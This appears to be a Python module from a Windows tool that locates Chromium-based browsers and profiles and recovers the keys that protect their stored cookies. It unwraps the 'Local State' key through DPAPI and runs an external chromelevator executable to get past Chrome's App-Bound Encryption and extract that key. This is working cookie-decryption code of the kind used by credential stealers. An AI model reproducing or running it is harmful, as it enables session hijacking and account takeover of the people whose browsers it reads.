"""Windows Chromium browser discovery and key helpers."""

import base64
import json
import os
import platform
import re
import subprocess
import sys
from pathlib import Path


BROWSER_DIRS = {
    "chrome": {
        "Windows": Path(os.environ.get("LOCALAPPDATA", ""))
        / "Google"
        / "Chrome"
        / "User Data",
    },
    "edge": {
        "Windows": Path(os.environ.get("LOCALAPPDATA", ""))
        / "Microsoft"
        / "Edge"
        / "User Data",
    },
    "brave": {
        "Windows": Path(os.environ.get("LOCALAPPDATA", ""))
        / "BraveSoftware"
        / "Brave-Browser"
        / "User Data",
    },
    "opera": {
        "Windows": Path(os.environ.get("APPDATA", ""))
        / "Opera Software"
        / "Opera Stable",
    },
    "vivaldi": {
        "Windows": Path(os.environ.get("LOCALAPPDATA", "")) / "Vivaldi" / "User Data",
    },
    "chromium": {
        "Windows": Path(os.environ.get("LOCALAPPDATA", "")) / "Chromium" / "User Data",
    },
    "arc": {
        "Windows": Path(os.environ.get("LOCALAPPDATA", "")) / "Arc" / "User Data",
    },
}

BROWSER_PROCESSES = {
    "chrome": {"Windows": {"chrome.exe"}},
    "edge": {"Windows": {"msedge.exe"}},
    "brave": {"Windows": {"brave.exe"}},
    "opera": {"Windows": {"opera.exe"}},
    "vivaldi": {"Windows": {"vivaldi.exe"}},
    "chromium": {"Windows": {"chromium.exe"}},
    "arc": {"Windows": {"Arc.exe"}},
}


def detect_browsers():
    """Return {name: UserDataDir} for Chromium browsers found on this machine."""
    system = platform.system()
    found = {}
    for name, paths in BROWSER_DIRS.items():
        path = paths.get(system)
        if path and path.exists():
            found[name] = path
    return found


def list_profiles(user_data_dir):
    """Return profile names whose Cookies DB exists in this User Data dir."""
    if not user_data_dir or not user_data_dir.exists():
        return []
    profiles = []
    for entry in sorted(user_data_dir.iterdir()):
        if not entry.is_dir():
            continue
        if entry.name == "Default" or entry.name.startswith("Profile "):
            if cookies_db_path(user_data_dir, entry.name).exists():
                profiles.append(entry.name)
    return profiles


def cookies_db_path(user_data_dir, profile):
    """
    Return a profile's cookies DB path.

    New Chromium versions use <profile>/Network/Cookies; older versions keep
    it at <profile>/Cookies. The newer path wins if it exists.
    """
    new_path = user_data_dir / profile / "Network" / "Cookies"
    if new_path.exists():
        return new_path
    return user_data_dir / profile / "Cookies"


def is_browser_running(browser_name):
    """Return True if any process for this browser is currently running."""
    try:
        import psutil
    except ImportError:
        return None

    system = platform.system()
    targets = BROWSER_PROCESSES.get(browser_name, {}).get(system, set())
    for proc in psutil.process_iter(["name"]):
        try:
            if proc.info["name"] in targets:
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False


def get_encryption_key(user_data_dir):
    """
    Read Local State, extract the wrapped key, and unwrap it with Windows DPAPI.
    Returns the raw AES key bytes used for cookie encryption.
    """
    local_state_path = user_data_dir / "Local State"
    if not local_state_path.exists():
        raise FileNotFoundError(f"Local State not found: {local_state_path}")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    os_crypt = local_state.get("os_crypt", {})
    if not os_crypt.get("encrypted_key"):
        raise ValueError(
            f"No os_crypt.encrypted_key in {local_state_path}. "
            "Is this a Chromium-based browser?"
        )
    if os_crypt.get("app_bound_encrypted_key"):
        sys.stderr.write(
            "INFO: This Local State contains an 'app_bound_encrypted_key' "
            "(Chrome 127+ App-Bound Encryption on Windows). chromelevator "
            "will be used to extract the app-bound key for v20 cookie "
            "decryption.\n"
        )

    if platform.system() != "Windows":
        raise RuntimeError("This tool currently supports Windows only.")
    encrypted_key = base64.b64decode(os_crypt["encrypted_key"])
    return _unwrap_key_windows(encrypted_key)


def detect_browser_key(user_data_dir):
    """Return the short browser key (chrome, edge, brave, ...) from a path."""
    s = str(user_data_dir).lower().replace("\\", "/")
    for key in ("brave", "vivaldi", "edge", "opera", "arc", "chromium", "chrome"):
        if key in s:
            if key == "chrome" and "chromium" in s:
                continue
            return key
    return "chrome"


def browser_arg_or_detect(arg_name, user_data_dir):
    """Return a browser key from CLI arg when available, else infer from path."""
    return arg_name or detect_browser_key(user_data_dir)


def get_app_bound_key(browser_name, chromelevator_path=None):
    """
    Run chromelevator_x64.exe to extract the App-Bound Encryption key.

    Returns the 32-byte AES key bytes, or None if the tool is unavailable
    or fails.
    """
    chromelevator = _get_chromelevator_path(chromelevator_path)
    if not chromelevator:
        sys.stderr.write(
            "WARNING: chromelevator_x64.exe not found next to transfer.py "
            "or in the current directory. App-Bound Encryption keys cannot "
            "be extracted.\n"
        )
        return None

    sys.stderr.write(f"Running {chromelevator.name} {browser_name} ...\n")
    try:
        result = subprocess.run(
            [str(chromelevator), browser_name],
            capture_output=True,
            text=True,
            timeout=120,
            cwd=str(chromelevator.parent),
        )
    except subprocess.TimeoutExpired:
        sys.stderr.write("ERROR: chromelevator timed out after 120s.\n")
        return None
    except FileNotFoundError:
        sys.stderr.write("ERROR: chromelevator not found.\n")
        return None

    output = result.stdout + result.stderr
    if result.returncode != 0 and not output.strip():
        sys.stderr.write(f"ERROR: chromelevator exited with code {result.returncode}\n")
        return None

    match = re.search(
        r"App-Bound Encryption Key[^\n]*\n[^0-9A-Fa-f]*([0-9A-Fa-f]{64})",
        output,
    )
    if not match:
        match = re.search(
            r"App-Bound Encryption Key[^\n]*([0-9A-Fa-f]{64})",
            output,
        )
    if match:
        key_bytes = bytes.fromhex(match.group(1))
        sys.stderr.write(f"App-bound key extracted ({len(key_bytes)} bytes)\n")
        return key_bytes

    sys.stderr.write(
        "WARNING: Could not parse App-Bound Encryption Key from chromelevator output.\n"
    )
    return None


def has_app_bound_key(user_data_dir):
    """Return True if Local State contains an app_bound_encrypted_key."""
    local_state_path = user_data_dir / "Local State"
    if not local_state_path.exists():
        return False
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        return bool(local_state.get("os_crypt", {}).get("app_bound_encrypted_key"))
    except Exception:
        return False


def _get_chromelevator_path(explicit_path=None):
    """Return the configured chromelevator executable path, if available."""
    if explicit_path:
        exe = Path(explicit_path).expanduser()
        if exe.exists():
            return exe

    env_path = os.environ.get("CHROMEELEVATOR_PATH")
    if env_path:
        exe = Path(env_path).expanduser()
        if exe.exists():
            return exe

    script_dir = Path(__file__).resolve().parent
    exe = script_dir / "chromelevator_x64.exe"
    if exe.exists():
        return exe
    cwd_exe = Path.cwd() / "chromelevator_x64.exe"
    if cwd_exe.exists():
        return cwd_exe
    return None


def _unwrap_key_windows(encrypted_key):
    if encrypted_key.startswith(b"DPAPI"):
        encrypted_key = encrypted_key[5:]
    try:
        import win32crypt
    except ImportError:
        raise ImportError(
            "On Windows, pywin32 is required. Install with:\n    pip install pywin32"
        )

    result = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)
    # pywin32 returns (description, data) in practice. Pick the binary item.
    for item in result:
        if isinstance(item, (bytes, bytearray)):
            return bytes(item)
    raise ValueError(
        "CryptUnprotectData returned no binary data (got "
        f"{[type(x).__name__ for x in result]!r})"
    )
